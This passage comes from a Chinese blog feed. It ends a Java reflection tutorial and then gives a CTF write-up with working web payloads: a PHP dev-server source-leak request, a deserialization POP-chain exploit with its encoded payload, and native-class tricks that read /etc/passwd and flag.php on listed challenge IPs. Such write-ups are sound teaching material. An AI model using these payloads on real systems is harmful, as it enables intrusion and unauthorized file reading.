System.out.println(name.get(newInstance));<br>    &#125;<br>&#125;<br><br>输出：<br>stu<br></code></pre></td></tr></table></figure><h5 id="6-2、设置成员变量的值"><a href="#6-2、设置成员变量的值" class="headerlink" title="6.2、设置成员变量的值"></a>6.2、设置成员变量的值</h5><ul><li>set()</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflect1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; stu = Class.forName(<span class="hljs-string">&quot;com.leekos.Student&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">newInstance</span> <span class="hljs-operator">=</span> stu.newInstance();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> stu.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        name.set(newInstance,<span class="hljs-string">&quot;666&quot;</span>);<br>        System.out.println(name.get(newInstance));<br>    &#125;<br>&#125;<br><br>输出：<br><span class="hljs-number">666</span><br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>反射常用的方法</p><ul><li>获取类的⽅法： Class.forName()</li><li>实例化类对象的⽅法： newInstance()</li><li>获取函数的⽅法： getMethod()</li><li>执⾏函数的⽅法： invoke()</li><li>限制突破方法：setAccessible()</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反射</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>黄河公安技能挑战赛(WP)</title>
    <link href="/2023/08/24/%E9%BB%84%E6%B2%B3%E5%85%AC%E5%AE%89%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B(WP)/"/>
    <url>/2023/08/24/%E9%BB%84%E6%B2%B3%E5%85%AC%E5%AE%89%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B(WP)/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="babyPHP"><a href="#babyPHP" class="headerlink" title="babyPHP"></a>babyPHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&#x27;|\&quot;|\`| |&lt;|&gt;|?|\^|%|\$/&quot;</span>, <span class="hljs-variable">$num</span>)) &#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nononno&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return $&#123;num&#125; != 2;&quot;</span>) &amp;&amp; <span class="hljs-variable">$num</span> == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>) != <span class="hljs-literal">true</span>) &#123;<br> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;2&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>仔细读题，主要考察php弱类型比较，我们可以直接传字母就行：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">43.138</span><span class="hljs-number">.65</span><span class="hljs-number">.13</span>:<span class="hljs-number">2025</span>/?<span class="hljs-built_in">num</span>=<span class="hljs-keyword">a</span><br></code></pre></td></tr></table></figure><h3 id="funnyPHP"><a href="#funnyPHP" class="headerlink" title="funnyPHP"></a>funnyPHP</h3><p>我们访问的路径为：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">47.104</span>.<span class="hljs-number">14.160</span>:<span class="hljs-number">3344</span>/hint.php<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/nymwrgbYCXhIaKv.png" alt="image-20230305132410885"></p><p>当我们访问<code>根目录</code>时：</p><img src="https://s2.loli.net/2023/03/05/c95LENASj8RmWJb.png" alt="image-20230305132555645" style="zoom:33%;" /><p>可以判断这里为： php Development Server 启动的服务</p><p><img src="https://s2.loli.net/2023/03/05/hNvOJdPoV1rnbj4.png" alt="image-20230305132904876"></p><p>查询得知，这里考察的是 <strong>PHP&lt;&#x3D;7.4.21 Development Server源码泄露漏洞</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">GET /puzzle.php HTTP/<span class="hljs-number">1.1</span> <br>Host: pd.research<br>\r\n<br>\r\n<br>GET / HTTP/<span class="hljs-number">1.1</span><br>\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>当我们以如上方式发送数据包时，我们可以获得 puzzle.php 的源码：</p><p><img src="https://s2.loli.net/2023/03/05/TZ1LxfcuOzhP5ak.png" alt="image-20230305133507277"></p><p>使用bp时要注意，我们要把 自动填充 content-length关闭掉</p><p><img src="https://s2.loli.net/2023/03/05/rT5OUJQpFfaGsbk.png" alt="image-20230305133431311"></p><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sdpc</span> = [<span class="hljs-string">&quot;welcome&quot;</span> =&gt; <span class="hljs-string">&quot;yeah, something hidden.&quot;</span>];<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$name</span>[<span class="hljs-variable">$name</span>]();<br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;sdpc[<span class="hljs-string">&quot;welcome&quot;</span>]; <span class="hljs-comment">//对大家表示欢迎</span><br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$c</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;c = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b ? <span class="hljs-variable language_">$this</span>-&gt;c-&gt;<span class="hljs-title function_ invoke__">sdpc</span>(<span class="hljs-string">&#x27;welcom&#x27;</span>) : <span class="hljs-string">&#x27;welcome!&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;c; <span class="hljs-comment">//变着法欢迎大家</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/fl4g&#x27;</span>);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;sdpc&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;sdpc&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>());<br>&#125;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这是一个反序列化漏洞，我们可以如下构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sdpc</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;sdpc = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;sdpc&quot;</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Evil</span>(),<span class="hljs-string">&#x27;getflag&#x27;</span>));<br>    &#125;<span class="hljs-comment">//注意修改$sdpc的值为一个数组 </span><br>    <span class="hljs-comment">//array(&#x27;sdpc&#x27;=&gt;array(new Evil(),&#x27;getflag&#x27;))</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-variable">$name</span>[<span class="hljs-variable">$name</span>]();<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;sdpc[<span class="hljs-string">&quot;welcome&quot;</span>]; <span class="hljs-comment">//对大家表示欢迎</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$c</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;c = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>(); <span class="hljs-comment">//注意修改为创建A类对象</span><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b ? <span class="hljs-variable language_">$this</span>-&gt;c-&gt;<span class="hljs-title function_ invoke__">sdpc</span>(<span class="hljs-string">&#x27;welcom&#x27;</span>) : <span class="hljs-string">&#x27;welcome!&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;c; <span class="hljs-comment">//给b赋值 ，触发 ___call</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;1&#x27;</span>;<br>        <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/fl4g&#x27;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$ca</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$cb</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$cc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>();<br><br><span class="hljs-variable">$cc</span>-&gt;b = <span class="hljs-string">&#x27;sp4c1ous&#x27;</span>;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$cc</span>));<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">sdpc<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>C<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>b<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>sp<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>ous<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span><span class="hljs-variable">%2</span>A<span class="hljs-variable">%00</span><span class="hljs-keyword">c</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>sdpc<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Ba<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>sdpc<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Ba<span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bi<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Evil<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%7</span>Di<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">7</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>getflag<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><p>这里有一个点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;1&#x27;</span>;<br><br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Evil</span>(),<span class="hljs-string">&#x27;getflag&#x27;</span>)());<br><span class="hljs-comment">//输出： 1</span><br></code></pre></td></tr></table></figure><p><strong><code>array(new Evil(),&#39;getflag&#39;)()</code></strong> </p><p>这样子相当于 Evil对象eval调用它的getflag()方法： <code>eval::getflag()</code></p><p>这里不是很懂</p><h3 id="Ezphp"><a href="#Ezphp" class="headerlink" title="Ezphp"></a>Ezphp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;g&#x27;</span>];<br><span class="hljs-variable">$t</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$g</span>(<span class="hljs-variable">$t</span>); <br></code></pre></td></tr></table></figure><p>这个地方直接要我们创建对象，但是又没有自定义类，所以我们应该寻找<strong>php原生类</strong></p><p>最初我想到的是 <code>Error</code>、<code>Exception</code>类，但是没什么用，可以用来执行xss漏洞</p><p>然后我找到了如下几个类：</p><h4 id="遍历文件目录的类"><a href="#遍历文件目录的类" class="headerlink" title="遍历文件目录的类"></a><strong>遍历文件目录的类</strong></h4><ul><li>DirectoryIterator </li><li>FilesystemIterator </li><li>GlobIterator</li></ul><h5 id="1、DirectoryIterator："><a href="#1、DirectoryIterator：" class="headerlink" title="1、DirectoryIterator："></a>1、DirectoryIterator：</h5><p>会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 <code>__toString()</code> 方法，输出指定目录里面经过排序之后的第一个文件名</p><p>我们可以配合<code>glob协议</code> 模式匹配来寻找我们想要的文件路径：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">43.138</span>.<span class="hljs-number">65.13</span>:<span class="hljs-number">2023</span><span class="hljs-regexp">/?g=DirectoryIterator&amp;t=glob:/</span><span class="hljs-regexp">//</span>var<span class="hljs-regexp">/www/</span>h*<br><span class="hljs-regexp">//</span>回显：html<br></code></pre></td></tr></table></figure><p>我们想要得到路径下所有的文件、目录，需要遍历输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br><span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2、FilesystemIterator"><a href="#2、FilesystemIterator" class="headerlink" title="2、FilesystemIterator:"></a>2、FilesystemIterator:</h5><p>和上面差不多：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br><span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="3、Globlterator"><a href="#3、Globlterator" class="headerlink" title="3、Globlterator"></a>3、<strong>Globlterator</strong></h5><p>与前两个类的作用相似，GlobIterator 类也是可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径。</p><p><code>在这个类中不需要配合glob伪协议，可以直接使用</code> 传参直接给路径就行</p><h4 id="读取文件内容的类："><a href="#读取文件内容的类：" class="headerlink" title="读取文件内容的类："></a>读取文件内容的类：</h4><h5 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h5><p>(PHP 5 &gt;&#x3D; 5.1.2, PHP 7, PHP 8)</p><blockquote><p>SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作。</p></blockquote><p>SplFileObject继承自 SplFileInfo</p><img src="https://s2.loli.net/2023/03/05/gRaV2DpnGAE8kt4.png" alt="image-20230305141449069" style="zoom:33%;" /><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">43.138</span>.<span class="hljs-number">65.13</span>:<span class="hljs-number">2023</span><span class="hljs-regexp">/?g=SplFileObject&amp;t=/</span>etc/passwd<br></code></pre></td></tr></table></figure><p>读取到了 <code>/etc/passwd</code> 内容</p><p>这里我们可以<code>结合php伪协议</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//43.138.65.13:2023/?g=SplFileObject&amp;t=php://filter/convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/QOrRblBYezcmoMs.png" alt="image-20230305141633305"></p><p>成功读取flag</p><p><a href="https://zhuanlan.zhihu.com/p/458866772">相关文章</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h3><img src="https://s2.loli.net/2023/03/05/SIeU8ZkpHEAYXsv.png" alt="image-20230305143100126" style="zoom:33%;" /><p>解压密码在最底下</p><p><img src="https://s2.loli.net/2023/03/05/pEw1aGB5kl97LnR.png" alt="image-20230305143139692"></p><p>打开txt文件，<code>ZjRrM19rM3k=</code> base64解密是一个假的key</p><p>我们滑倒txt文件最底下：</p><p><img src="https://s2.loli.net/2023/03/05/w2uULElTmOpXsHg.png" alt="image-20230305143356892"></p><p>有一大堆不可见的东西，在记事本打开：</p><p><img src="https://s2.loli.net/2023/03/05/qPi71olDCFpaI4t.png" alt="image-20230305143335614"></p><p>发现没有什么，这因该是<code>零宽字符</code></p><p><a href="https://www.mzy0.com/ctftools/zerowidth1/">零宽字符解密</a></p><img src="https://s2.loli.net/2023/03/05/zZkKMhLjeyrfaxm.png" alt="image-20230305143503869" style="zoom:33%;" /><p><code>XzFzX0U0NXk=</code> 